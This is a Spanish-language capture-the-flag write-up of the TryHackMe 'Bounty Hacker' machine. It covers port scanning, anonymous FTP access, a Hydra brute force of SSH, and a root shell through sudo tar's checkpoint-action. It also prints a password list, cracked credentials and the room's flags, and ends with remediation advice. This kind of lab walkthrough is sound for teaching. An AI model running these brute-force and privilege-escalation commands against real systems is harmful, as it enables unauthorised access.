---
layout: single
classes: wide
title: "THM Bounty Hacker - Writeup"
date: 2026-11-03
difficulty: Fácil
operating_system: Linux
platform: THM
tags:
  - FTP
  - Anonymous Login
  - Brute Force
  - Hydra
  - SSH
  - Sudo
  - GTFOBins
  - Privilege Escalation
summary: "Cadena de explotación: acceso anónimo a FTP para obtener listas de usuarios y contraseñas, fuerza bruta con Hydra contra SSH, acceso como lin y escalada a root abusando de permisos sudo sobre tar."
---

## Información general

| Campo | Valor |
|-------|-------|
| Plataforma | TryHackMe |
| Sistema operativo | Linux |
| Dificultad | Fácil |
| Tags | `FTP`, `Anonymous Login`, `Brute Force`, `Hydra`, `SSH`, `Sudo`, `GTFOBins`, `Privilege Escalation` |
{: .info-table}

## Reconocimiento

Escaneo inicial para detectar puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.128.166.231
```

Puertos abiertos detectados:

| Puerto | Estado | Servicio |
|--------|--------|----------|
| 21/tcp | open | ftp |
| 22/tcp | open | ssh |
| 80/tcp | open | http |

Escaneo de versiones y scripts por defecto sobre los puertos descubiertos:

```bash
nmap -p21,22,80 -sCV 10.128.166.231 -oN targeted
```

Resultados relevantes:

- **21/tcp** — vsftpd 3.0.5. El servicio permite **login anónimo** (`Anonymous FTP login allowed`), aunque el listado con `PASV` falla.
- **22/tcp** — OpenSSH 8.2p1 Ubuntu 4ubuntu0.13.
- **80/tcp** — Apache httpd 2.4.41 (Ubuntu).

## Enumeración

### Web (puerto 80)

```bash
whatweb http://10.128.166.231
```

El sitio muestra una conversación entre personajes con pistas temáticas (Spike, Jet, Ed, Faye, Lin), lo que sugiere posibles nombres de usuario.

Enumeración de directorios:

```bash
feroxbuster -u http://10.128.166.231 -t 50 --filter-status 404
```

Se identifican rutas como `/images/` y `/javascript/`, sin vectores de explotación directos aparentes.

### FTP (puerto 21)

Con acceso anónimo, se listan archivos interesantes:

```bash
ftp 10.128.166.231
Name: anonymous
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Contenido de `task.txt`:

```text
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```

Contenido de `locks.txt` (lista de posibles contraseñas):

```text
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```

A partir de la conversación web y `task.txt`, se construye una lista de usuarios candidatos (`users.txt`): `spike`, `jet`, `ed`, `faye`, `lin`, `admin`, `root`.

## Explotación

### Fuerza bruta contra SSH

Con `hydra`, se prueban las combinaciones de `users.txt` y `locks.txt` contra SSH:

```bash
hydra -L users.txt -P locks.txt ssh://10.128.166.231
```

Resultado:

```text
[22][ssh] host: 10.128.166.231   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
```

### Acceso inicial

```bash
ssh lin@10.128.166.231
```

Con las credenciales obtenidas se accede como `lin` y se localiza la flag de usuario en el escritorio:

```bash
lin@ip-10-128-166-231:~/Desktop$ ls
user.txt
```

## User Flag

```bash
lin@ip-10-128-166-231:~/Desktop$ cat user.txt
THM{CR1M3_SyNd1C4T3}
```

## Escalada de privilegios

Se revisan los permisos `sudo`:

```bash
lin@ip-10-128-166-231:~/Desktop$ sudo -l
```

```text
User lin may run the following commands on ip-10-128-166-231:
    (root) /bin/tar
```

El binario `tar` con `sudo` permite ejecutar comandos arbitrarios mediante `--checkpoint-action` (técnica documentada en GTFOBins):

```bash
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```text
# whoami
root
```

## Root Flag

```bash
# cat /root/root.txt
THM{80UN7Y_h4cK3r}
```

## Flags

| Tipo | Flag |
|------|------|
| user.txt | `THM{CR1M3_SyNd1C4T3}` |
| root.txt | `THM{80UN7Y_h4cK3r}` |

## Cadena de explotación

```text
FTP anónimo (vsftpd 3.0.5)
-> Descarga de locks.txt + task.txt
-> Construcción de listas de usuarios/contraseñas
-> Hydra contra SSH
-> Acceso como lin
-> sudo /bin/tar (GTFOBins)
-> Root shell
```

## Lecciones técnicas

- FTP con acceso anónimo puede filtrar información sensible (listas de contraseñas, pistas de usuarios) incluso sin permitir listado directo en algunos modos.
- Las pistas en contenido web (`index`) y archivos internos (`task.txt`) ayudan a reducir el espacio de búsqueda para ataques de credenciales.
- Conceder `sudo` sobre binarios como `tar` equivale a conceder ejecución como root; se debe restringir mediante perfiles específicos o eliminar el permiso.

## Remediación

1. Deshabilitar el acceso anónimo a FTP o restringirlo a contenido no sensible.
2. Eliminar archivos con credenciales/pistas (`locks.txt`, `task.txt`) de servicios accesibles.
3. Aplicar políticas de contraseñas robustas y monitorear intentos de fuerza bruta en SSH.
4. Revisar `sudoers` y eliminar permisos peligrosos sobre binarios con capacidades de ejecución (GTFOBins).
